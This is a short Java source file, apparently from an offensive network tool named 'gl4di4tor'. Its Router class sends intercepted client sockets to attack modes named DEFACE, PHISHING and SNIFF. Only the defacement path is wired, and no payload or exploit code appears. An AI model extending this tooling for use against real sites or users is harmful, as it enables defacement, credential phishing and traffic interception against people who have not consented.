package gl4di4tor;

import gl4di4tor.assets.AttackMode;
import gl4di4tor.configuration.Config;
import gl4di4tor.log.LogService;
import gl4di4tor.module.deface.DefaceModule;

import java.net.Socket;

/**
 * Created by Gladiator on 7/29/2017 AD.
 */
public class Router {

    private static class Holder {
        static final Router INSTANCE = new Router();
    }

    public static Router getInstance() {
        return Holder.INSTANCE;
    }

    public void route(Socket client) throws Exception {
        LogService.debug("Routing client to " + Config.getInstance().getMode().toUpperCase() + " module");

        switch (AttackMode.valueOf(Config.getInstance().getMode().toUpperCase())) {
            case DEFACE:
                new Thread(new DefaceModule(client)).start();
                break;
            case PHISHING:
                break;
            case SNIFF:
                break;
            default:
                LogService.error("Route not find.");
                client.close();
        }
    }
}
